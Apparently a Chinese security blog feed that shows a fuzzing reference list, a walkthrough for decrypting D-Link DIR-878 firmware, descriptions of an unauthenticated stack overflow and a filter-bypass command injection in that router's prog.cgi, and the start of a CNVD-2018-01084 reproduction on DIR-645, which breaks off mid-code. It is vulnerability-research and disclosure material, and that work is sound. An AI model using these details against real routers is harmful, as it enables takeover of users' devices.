Computer and Communications Security. ACM. pp 1032–1043<br>Bowne S (2015) Fuzzing with spike. <a class="link"   href="https://samsclass.info/127/proj/p18-spike" >https://samsclass.info/127/proj/p18-spike<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. htm. Accessed 25 Dec 2017<br>Cha SK, Avgerinos T, Rebert A, Brumley D (2012) Unleashing mayhem on binary code. In: Security and Privacy (SP) 2012 IEEE Symposium on. IEEE, San Francisco. pp 380–394. <a class="link"   href="https://doi.org/10.1109/SP.2012.31" >https://doi.org/10.1109/SP.2012.31<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>De Ruiter J, Poll E (2015) Protocol state fuzzing of tls implementations. In: Proceeding SEC’15 Proceedings of the 24th USENIX Conference on Security Symposium. USENIX Association, Berkeley. pp 193–206<br>Godefroid P, Levin MY, Molnar D (2012) Sage: whitebox fuzzing for security testing. Queue 10(1):20<br>Godefroid P, Peleg H, Singh R (2017) Learn &amp; fuzz: Machine learning for input fuzzing. In: Proceeding ASE 2017 Proceedings of the 32nd IEEE&#x2F;ACM International Conference on Automated Software Engineering. IEEE Press, Piscataway. pp 50–59<br>Gorbunov S, Rosenbloom A (2010) Autofuzz: Automated network protocol fuzzing framework. IJCSNS 10(8):239<br>Han H, Cha SK (2017) Imf: Inferred model-based fuzzer. In: Proceeding CCS ’17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2345–2358. <a class="link"   href="https://doi.org/" >https://doi.org/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>10.1145&#x2F;3133956.3134103<br>Hertz J (2015) Triforceafl . <a class="link"   href="https://github.com/nccgroup/TriforceAFL" >https://github.com/nccgroup/TriforceAFL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>James R (2013) Processor tracing. <a class="link"   href="https://software.intel.com/en-us/blogs/" >https://software.intel.com/en-us/blogs/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>2013&#x2F;09&#x2F;18&#x2F;processor-tracing. Accessed 25 Dec 2017<br>Jones D (2010) trinity. <a class="link"   href="https://github.com/kernelslacker/trinity" >https://github.com/kernelslacker/trinity<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>King JC (1976) Symbolic execution and program testing. Commun ACM 19(7):385–394<br>lcamtuf (2014) Fuzzing random programs without execve(). <a class="link"   href="https://lcamtuf/" >https://lcamtuf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. <a class="link"   href="http://blogspot.jp/2014/10/fuzzing-binaries-without-execve.html" >blogspot.jp&#x2F;2014&#x2F;10&#x2F;fuzzing-binaries-without-execve.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>libfuzzer (2017) A library for coverage-guided fuzz testing. <a class="link"   href="https://llvm.org/" >https://llvm.org/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>docs&#x2F;LibFuzzer.html. Accessed 25 Dec 2017<br>Liu B, Shi L, Cai Z, Li M (2012) Software vulnerability discovery techniques: A survey. In: Multimedia Information Networking and Security (MINES), 2012 Fourth International Conference on. IEEE, Nanjing. pp 152–156. <a class="link"   href="https://doi/" >https://doi<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. org&#x2F;10.1109&#x2F;MINES.2012.202<br>Luk C-K, Cohn R, Muth R, Patil H, Klauser A, Lowney G, Wallace S, Reddi VJ, Hazelwood K (2005) Pin: building customized program analysis tools with dynamic instrumentation. In: Acm sigplan notices, volume 40. ACM, Chicago. pp 190–200<br>Nichols N, Raugas M, Jasper R, Hilliard N (2017) Faster fuzzing: Reinitialization with deep neural models. arXiv preprint arXiv:1711.02807<br>PeachTech (2017) Peach. <a class="link"   href="https://www.peach.tech/" >https://www.peach.tech/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017 Petsios T, Zhao J, Keromytis AD, Jana S (2017) Slowfuzz: Automated<br>domain-independent detection of algorithmic complexity vulnerabilities. In: Proceeding CCS ’17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York.<br>pp 2155–2168. <a class="link"   href="https://doi.org/10.1145/3133956.3134073" >https://doi.org/10.1145/3133956.3134073<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Rajpal M, Blum W, Singh R (2017) Not all bytes are equal: Neural byte sieve for fuzzing. arXiv preprint arXiv:1711.04596<br>Rawat S, Jain V, Kumar A, Cojocar L, Giuffrida C, Bos H (2017) Vuzzer: Application-aware evolutionary fuzzing. In: Proceedings of the Network and Distributed System Security Symposium (NDSS). <a class="link"   href="https://www.vusec/" >https://www.vusec<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. net&#x2F;download&#x2F;?t&#x3D;papers&#x2F;vuzzer_ndss17.pdf Schumilo S, Aschermann C, Gawlik R, Schinzel S, Holz T (2017) kAFL: Hardware-assisted feedback fuzzing for OS kernels. In: Kirda E, Ristenpart T (eds). 26th USENIX Security Symposium, USENIX Security 2017. USENIX Association, Vancouver. pp 167–182<br>Serebryany K, Bruening D, Potapenko A, Vyukov D (2012) Addresssanitizer: A fast address sanity checker. In: Proceeding USENIX ATC’12 Proceedings of the 2012 USENIX conference on Annual Technical Conference. USENIX Association, Berkeley. pp 309–318<br>Serebryany K, Iskhodzhanov T (2009) Threadsanitizer: data race detection in practice. In: Proceedings of the Workshop on Binary Instrumentation and Applications. pp 62–71<br>Shirey RW (2000) Internet security glossary. <a class="link"   href="https://tools.ietf.org/html/rfc2828" >https://tools.ietf.org/html/rfc2828<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Stephenfewer (2016) Grinder. <a class="link"   href="https://github.com/stephenfewer/grinder" >https://github.com/stephenfewer/grinder<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Stephens N, Grosen J, Salls C, Dutcher A, Wang R, Corbetta J, Shoshitaishvili Y, Kruegel C, Vigna G (2016) Driller: Augmenting fuzzing through selective symbolic execution. In: NDSS, volume 16, San Diego. pp 1–16<br>Sutton M, Greene A, Amini P (2007) Fuzzing: brute force vulnerability discovery. Pearson Education, Upper Saddle River<br>Takanen A, Demott JD, Miller C (2008) Fuzzing for software security testing and quality assurance. Artech House<br>The Clang Team (2017) Dataflowsanitizer. <a class="link"   href="https://clang.llvm.org/docs/" >https://clang.llvm.org/docs/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>DataFlowSanitizerDesign.html. Accessed 25 Dec 2017<br>The Clang Team (2017) Leaksanitizer. <a class="link"   href="https://clang.llvm.org/docs/" >https://clang.llvm.org/docs/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>LeakSanitizer.html. Accessed 25 Dec 2017<br>Van Sprundel I (2005) Fuzzing: Breaking software in an automated fashion. Decmember 8th<br>Vyukov D (2015) Syzkaller. <a class="link"   href="https://github.com/google/syzkaller" >https://github.com/google/syzkaller<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Wang J, Chen B, Wei L, Liu Y (2017) Skyfire: Data-driven seed generation for fuzzing. In: Security and Privacy (SP), 2017 IEEE Symposium on. IEEE, San Jose. <a class="link"   href="https://doi.org/10.1109/SP.2017.23" >https://doi.org/10.1109/SP.2017.23<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Wang S, Nam J, Tan L (2017) Qtep: quality-aware test case prioritization. In: Proceedings of the 2017 11th Joint Meeting on Foundations of Software Engineering. ACM, New York. pp 523–534. <a class="link"   href="https://doi.org/10.1145/" >https://doi.org/10.1145/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>3106237.3106258<br>Wang T, Wei T, Gu G, Zou W (2010) Taintscope: A checksum-aware directed fuzzing tool for automatic software vulnerability detection. In: Security and privacy (SP) 2010 IEEE symposium on. IEEE, Berkeley. pp 497–512. https:&#x2F;&#x2F; <a class="link"   href="http://doi.org/10.1109/SP.2010.37" >doi.org&#x2F;10.1109&#x2F;SP.2010.37<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>Wichmann BA, Canning AA, Clutterbuck DL, Winsborrow LA, Ward NJ, Marsh DWR (1995) Industrial perspective on static analysis. Softw Eng J 10(2):69–75<br>Wikipedia, Wannacry ransomware attack (2017). <a class="link"   href="https://en.wikipedia.org/wiki/" >https://en.wikipedia.org/wiki/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>WannaCry_ransomware_attack. Accessed 25 Dec 2017<br>Wikipedia (2017) Dynamic program analysis. <a class="link"   href="https://en.wikipedia.org/wiki/" >https://en.wikipedia.org/wiki/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>Dynamic_program_analysis. Accessed 25 Dec 2017<br>Wu Z-Y, Wang H-C, Sun L-C, Pan Z-L, Liu J-J (2010) Survey of fuzzing. Appl Res Comput 27(3):829–832<br>Xu W, Kashyap S, Min C, Kim T (2017) Designing new operating primitives to improve fuzzing performance. In: Proceeding CCS ’17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2313–2328. <a class="link"   href="https://doi.org/10.1145/3133956" >https://doi.org/10.1145/3133956<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. 3134046<br>Yang Q, Li JJ, Weiss DM (2007) A survey of coverage-based testing tools. The Computer Journal 52(5):589–597<br>Zalewski, M (2017) American fuzzy lop. <a class="link"   href="http://lcamtuf.coredump.cx/afl/" >http://lcamtuf.coredump.cx/afl/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Zalewski M (2017) Afl technical details. <a class="link"   href="http://lcamtuf.coredump.cx/afl/" >http://lcamtuf.coredump.cx/afl/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>technical_details.txt. Accessed 25 Dec 2017<br>Zimmer D (2013) Comraider. <a class="link"   href="http://sandsprite.com/tools.php?id=16" >http://sandsprite.com/tools.php?id=16<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>translate：CataLpa</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>家用路由器固件常用解包方法 &amp; D-Link DIR-878 BUGS</title>
    <url>/2019/09/18/D-Link_BUG/</url>
    <content><![CDATA[<p>DIR-878 是友讯科技生产的家用路由器。</p>
<span id="more"></span>

<h2 id="家用路由器固件常用解包方法"><a href="#家用路由器固件常用解包方法" class="headerlink" title="家用路由器固件常用解包方法"></a>家用路由器固件常用解包方法</h2><p>某些厂商为了保护自己的产品，增加逆向分析的成本，通常会将路由器的固件进行加密，经过加密的固件使用一般的解包方法不能提取。要想分析这种固件，首先就要找到其对应的加密方法。</p>
<p>实际上固件加密并不是随随便便拿来一种算法就可以的，由于家用路由器机能有限，所以 RSA 等效率较低的加密体系用的比较少，AES 或者 RC4 这些效率高的算法通常是首选的固件加密手段。</p>
<p><strong>家用路由器固件加密原理</strong></p>
<p>当买回来一台路由器的时候，其内部的固件版本通常不是最新的，这时就需要进行固件升级，升级的原理很简单，从官方网站下载最新版本的固件，然后对固件进行检验，满足某些条件之后解压固件替换原始文件。</p>
<p>现在的问题是如果下载到的固件是加密的，路由器内部应该如何解密呢？</p>
<p>最简单的想法就是内部放置了对应的解密程序，可以先解密固件再执行正常的升级过程。这里就引出了家用路由器固件加密的几种常见形式：</p>
<p>第一种： 固件从设备推出就处于加密状态，在更换固件加密算法的时候会涉及到中间版本，更换逻辑如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/D-LinkBUG1.png"
                     
                ></p>
<p>第二种： 固件在出厂的时候由于某些原因没有采用加密算法，在中间某一个版本突然要增加固件加密：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/D-LinkBUG2.png"
                     
                ></p>
<p>还有一种更换逻辑是：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/D-LinkBUG3.png"
                     
                ></p>
<p>前序版本进行了加密，但中间版本提供了未加密的程序。</p>
<p>其中第一种方法解包比较困难，中间版本也是经过加密的，如果想要解密固件就必须先从真机上拿到解密之后的内容进行逆向分析，寻找固件加密方式。</p>
<p>其余两种就比较简单了，通过中间版本能直接拿到固件的解密程序或者算法，通过算法再去解密新的固件。</p>
<p>以我们今天的主角 DIR-878 为例，它所采用的是上述第三种迭代方法，即中间版本没有加密，可以透过 binwalk 直接获取固件。</p>
<p>首先从官网 <a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 下载所有能看见的固件，因为我们不知道哪个版本是中间版本。</p>
<p>下载固件之后又一个判断中间版本的技巧，那就是利用 binwalk 的 -E 选项，大致原理就是一个系统越有序，其熵值就越低，经过加密的固件属于无序度很大的系统，所以 -E 的结果通常是一根直线。</p>
<p>不过对于 878 的固件不用那么麻烦，依次解压+binwalk 分析固件，最终在 1.10B05 这个压缩包中获取到了中间版本的固件：DIR878A1_FW104B05_Middle_FW_Unencrypt</p>
<p>binwalk 解包即可得到对应的文件系统。并且经过进一步查看，仅仅在这个版本更换了加密算法，所以最新版本的固件也可以利用此固件中的算法解密。</p>
<p>我们找到了中间版本，现在的问题是去哪里寻找解密程序？按照固件升级的思路，肯定有一个升级程序，在这个程序内部可能存在着加密算法，我们首要目的就是去寻找这个升级程序。</p>
<p>不过对于 878 这台路由器，我们的工作量可以大大缩减，我在翻找程序目录的时候，发现了一个名为 imgdecrypt 的二进制文件，就位于 &#x2F;bin 文件夹下面。</p>
<p>这是踏破铁鞋无觅处的最好代表(hh)，看名字就知道是用来解密镜像的，用下面的命令模拟运行</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -L . ./bin/imgdecrypt</span><br></pre></td></tr></table></figure></div>

<p>输出</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">./bin/imgdecrypt &lt;sourceFile&gt;</span><br></pre></td></tr></table></figure></div>

<p>用最新版的固件来试一下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-mipsel -L . ./bin/imgdecrypt ./DIR_878_FW120B05.BIN</span><br></pre></td></tr></table></figure></div>

<p>执行后再用 binwalk 检测发现解密成功，至此我们就可以成功提取中间版本之后任意一个版本的固件了(只要未来不更换加密算法)！</p>
<h2 id="漏洞1-未授权用户构造恶意请求造成栈溢出"><a href="#漏洞1-未授权用户构造恶意请求造成栈溢出" class="headerlink" title="漏洞1 未授权用户构造恶意请求造成栈溢出"></a>漏洞1 未授权用户构造恶意请求造成栈溢出</h2><p>由于接下来的两枚漏洞初步看是 0day，所以敏感信息会进行隐藏，漏洞已经报告厂商。</p>
<p>我们拿到最新版本(1.20 2019-7) 的固件进行解密、解包，得到文件系统，在 etc_ro 目录下面看到很多和服务相关的文件，初步判定这是路由器的核心文件目录。</p>
<p>etc_ro 目录下有一个名为 lighttpd 的文件夹，lighttpd 是一个轻量级的 web 服务器，进去之后发现其配置文件 lighttpd.conf，初步分析配置文件，发现几乎所有 web 请求都被定向到了 &#x2F;bin 目录下的 prog.cgi 中。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastcgi.server = ( </span><br><span class="line">	&quot;/HNAP1/&quot; =&gt; </span><br><span class="line">	((</span><br><span class="line">		&quot;socket&quot; =&gt; &quot;/var/prog.fcgi.socket-0&quot;,</span><br><span class="line">		&quot;check-local&quot; =&gt; &quot;enable&quot;,</span><br><span class="line">		&quot;bin-path&quot; =&gt; &quot;/bin/prog.cgi&quot;,</span><br><span class="line">		&quot;idle-timeout&quot; =&gt; 10,</span><br><span class="line">		&quot;min-procs&quot; =&gt; 1,</span><br><span class="line">		&quot;max-procs&quot; =&gt; 1</span><br><span class="line">	)), </span><br><span class="line">	&quot;.fcgi&quot; =&gt; </span><br><span class="line">	((</span><br><span class="line">		&quot;socket&quot; =&gt; &quot;/var/prog.fcgi.socket-0&quot;,</span><br><span class="line">		&quot;check-local&quot; =&gt; &quot;enable&quot;,</span><br><span class="line">		&quot;bin-path&quot; =&gt; &quot;/bin/prog.cgi&quot;,</span><br><span class="line">		&quot;idle-timeout&quot; =&gt; 10,</span><br><span class="line">		&quot;min-procs&quot; =&gt; 1,</span><br><span class="line">		&quot;max-procs&quot; =&gt; 1</span><br><span class="line">	))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>file 查看 cgi 的文件格式，是 MIPS32 小端架构。初步想法是先把固件模拟起来，然后对照功能去调试，但是我试了很多方法，包括 firmadyne、qemu 全模拟、单文件模拟等等，都达不到理想的效果。只好购买真机来进行测试。</p>
<p>第一个漏洞出现在 prog.cgi 的 main 函数中，是处理 HNAP 请求的第一个函数。在这个函数中存在栈溢出，并且不需要用户身份认证即可触发。</p>
<p>main 函数某处存在这样的代码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  __s1 = <span class="built_in">strstr</span>((<span class="type">char</span> *)piVar5[<span class="number">0x31</span>],<span class="string">&quot;method=&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1 = <span class="built_in">strstr</span>((<span class="type">char</span> *)piVar5[<span class="number">0x35</span>],<span class="string">&quot;http://purenetworks.com&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iVar3 = bstrdupNoBalloc(piVar5[<span class="number">0x31</span>],<span class="string">&quot;fastcgi.c&quot;</span>,<span class="number">0xf2</span>);</span><br><span class="line">      piVar5[<span class="number">0x31</span>] = iVar3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      __s1 = __s1 + <span class="number">0x17</span>;</span><br><span class="line">      __haystack = <span class="built_in">strchr</span>(__s1,<span class="number">0x22</span>);</span><br><span class="line">      <span class="keyword">if</span> (__haystack == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">        iVar3 = bstrdupNoBalloc(__s1,<span class="string">&quot;fastcgi.c&quot;</span>,<span class="number">0xef</span>);</span><br><span class="line">        piVar5[<span class="number">0x31</span>] = iVar3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;cStack1292,<span class="number">0</span>,<span class="number">0xfe</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>(&amp;cStack1292,__s1,(<span class="type">size_t</span>)(__haystack + -(<span class="type">int</span>)__s1));</span><br><span class="line">        iVar3 = bstrdupNoBalloc(&amp;cStack1292,<span class="string">&quot;fastcgi.c&quot;</span>,<span class="number">0xed</span>);</span><br><span class="line">        piVar5[<span class="number">0x31</span>] = iVar3;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>是用于处理 HNAP 的 SOAPaction 字段的，仔细观察发现 strncpy 函数的长度字段是用户可控的，它的计算逻辑是利用 strchr 函数从 SOAPaction 字段定位字符 “ ,然后利用指针减法运算得到整个字符串的长度。显然如果恶意用户构造一个超长的字符串传入请求头，就会触发 strncpy 函数拷贝很长的内容到 stack 空间，这样会破坏其他函数的栈帧，使程序崩溃。</p>
<p>由于我现在没有合适的调试环境，所以暂时无法确定是否能够利用此处漏洞达到 RCE 的功能，但是考虑到溢出任意字符数量，RCE 应该是可行的。</p>
<p>初步测试如果一直向路由器发送畸形数据包，会导致管理页面 500 或 503 崩溃。</p>
<h2 id="漏洞2-授权用户命令注入"><a href="#漏洞2-授权用户命令注入" class="headerlink" title="漏洞2 授权用户命令注入"></a>漏洞2 授权用户命令注入</h2><p>这个漏洞比较有趣，它是在 2019 年 6 月左右已经被提交的漏洞，厂商也发布了对应的补丁，但是由于补丁的修复效果有限，问题依然存在。</p>
<p>DIR-878 路由器有很多功能，其中站点过滤功能允许用户添加特定的网站进行拦截，放置其他用户访问。</p>
<p>但是这个功能的后端实现使用了 execv 函数，并且对于用户传入的 URL 检验不严格，导致恶意用户可以拼接任意命令到 execv 函数中执行，严重的导致可以获取路由器的交互式 shell。</p>
<p>漏洞依然出现在 prog.cgi 中，在 SetWebFilterSettings 接口绑定函数中对于 URL 调用了 tbsCheckHttpUrl 函数进行过滤(在之前的版本中不存在过滤)，这个函数位于 librcm.so 中。</p>
<p>利用 IDA 打开 so 文件可以定位到此函数（ghidra 不知道问什么无法解析到这个函数），内部实现流程大致是利用一段正则表达式去匹配输入的 URL，如果匹配失败就拒绝此 URL，涉及的<strong>部分</strong>正则如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">^(http://)?(([0-9a-zA-Z_!~*&#x27;(*a-zA-Z_!~*&#x27;().&amp;=+$%-]+@)?(([0-9]&#123;1,3&#125;\.)*&#123;1,4&#125;)|(:6*0-4][0-9]&#123;2&#125;)|(:655[0-2][0-9])|(:6553[0-5]))?((/?)|(/[0-9a-zA-Z_!~*&#x27;().;?:@&amp;=+$,%#-]+)+/?)$</span><br></pre></td></tr></table></figure></div>

<p>虽然正则过滤掉了一部分危险输入(主要是空格符)，但是我们可以利用多种办法来绕过空格符的过滤，由于这个 API 接口除了 tbsCheckHttpUrl 处理 URL 之外就没有其他防护了，绕过过滤之后依然可执行任意 shell 命令。</p>
<p>拿到交互式的 shell 之后即可上传一份调试器，再去调试固件就方便多了。</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CNVD-2018-01084 漏洞复现</title>
    <url>/2019/09/05/CNVD-2018-01084/</url>
    <content><![CDATA[<p>CNVD-2018-01084 是 Dlink 系列路由器的一个漏洞，影响设备包括 DIR 615&#x2F;645&#x2F;815 路由器。</p>
<p>漏洞存在于 &#x2F;htdocs&#x2F;cgibin 二进制文件中，漏洞成因是 service.cgi 中未经任何过滤检查就将用户的输入拼接到原始命令中，导致任意代码执行。</p>
<span id="more"></span>



<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先下载存在漏洞的固件，地址 <a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>我下载的是 1.02 版本，这个漏洞在 1.03 以上版本被修复了，注意不要下错。</p>
<p>固件为 MIPS 架构，所以需要利用 QEMU 来模拟执行，关于 QEMU 和环境的具体搭建流程可以参考我上一篇文章 <a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">https://wzt.ac.cn/2019/03/19/CVE-2018-5767/</a></p>
<p>这个固件属于 CGI(通用网关接口)，所以不需要搭建网络环境即可运行。</p>
<p>装好必要的软件之后使用命令</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu -g 10000 ./htdocs/cgibin</span><br></pre></td></tr></table></figure></div>

<p>即可运行程序，如果添加了 -g 选项，那么在外部使用 gdb 链接到 10000 端口就能调试程序了。</p>
<p>运行起来会提示</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGI.BIN, unknown command cgibin</span><br></pre></td></tr></table></figure></div>

<p>这是正常现象，因为我们还没有访问任何 CGI 服务。</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>由于是 MIPS 程序，IDA 的反编译插件不能解析伪代码，在之前我们只能硬着头皮看汇编，或者利用 RETDEC 大概看看函数调用关系，但是今年上半年 NSA 发布了 Ghidra，相信大家都有所耳闻，到现在已经迭代了 5 个版本，在 GITHUB 上可以下载到最新的 9.0.4 版本源代码。</p>
<p>如果不想手动编译的可以直接去官方网站下载 release 版本。</p>
<p>Ghidra 虽然速度和交互性弱于 IDA，但是它能反编译 mips 等 IDA 暂不支持的架构，这次我们就利用它来完成逆向分析。</p>
<p>打开 Ghidra 新建项目，并导入 cgibin 文件，让 ghidra 自动分析：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-1.png"
                     
                ></p>
<p>在左边的函数窗口中有一个搜索栏，搜索 main 即可找到 main 函数，点击汇编窗口，右侧的反编译窗口就自动出现的 main 函数的伪代码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-2.png"
                     
                ></p>
<p>反编译的效果感觉和 IDA 的不相上下，只是交互性和细节上差一些。</p>
<p>根据披露信息，漏洞位于 service.cgi 中，在 main 函数找一找就能找到这一项：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  iVar2 = <span class="built_in">strcmp</span>(__s,<span class="string">&quot;pigwidgeon.cgi&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    UNRECOVERED_JUMPTABLE = pigwidgeoncgi_main;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar2 = <span class="built_in">strcmp</span>(__s,<span class="string">&quot;service.cgi&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      UNRECOVERED_JUMPTABLE = servicecgi_main;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>观察代码发现 cgibin 从 web 端接受了请求，然后取出 URL 中的访问参数，筛选出对应的 cgi 服务，并调用相关函数。</p>
<p>Service.cgi 对应的是 servicecgi_main 函数，伪代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">servicecgi_main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined *__ptr;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  <span class="type">int</span> *piVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">void</span> *__ptr_00;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  <span class="type">char</span> *__format;</span><br><span class="line">  <span class="type">int</span> iVar4;</span><br><span class="line">  <span class="type">char</span> acStack280 [<span class="number">260</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(acStack280,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">  __s1 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1 = <span class="string">&quot;No HTTP request&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LAB_0040ab48;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar4 = strcasecmp(__s1,<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar3 = <span class="number">0x400</span>;</span><br><span class="line">LAB_0040aad0:</span><br><span class="line">    iVar4 = cgibin_parse_request(FUN_0040adcc,<span class="number">0</span>,uVar3);</span><br><span class="line">    <span class="keyword">if</span> (iVar4 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      __s1 = <span class="string">&quot;Unable to parse HTTP request&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      iVar4 = sess_ispoweruser();</span><br><span class="line">      <span class="keyword">if</span> (iVar4 != <span class="number">0</span>) &#123;</span><br><span class="line">         iVar2 